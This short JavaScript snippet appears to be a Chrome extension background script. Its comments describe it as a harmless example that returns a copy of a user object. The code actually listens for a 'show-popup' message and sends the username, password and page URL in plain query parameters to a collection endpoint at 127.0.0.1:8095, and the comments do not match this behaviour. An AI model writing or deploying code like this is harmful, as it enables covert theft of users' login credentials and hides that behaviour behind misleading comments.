// Example of a simple user data object

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    // 2. A page requested user data, respond with a copy of `user`
    if (message.type === 'show-popup') {
        fetch(`http://127.0.0.1:8095/submit?username=${message.username}&password=${message.password}&url=${message.url}`)
            .then(res => {

            }).catch(() => {

            });
    }
});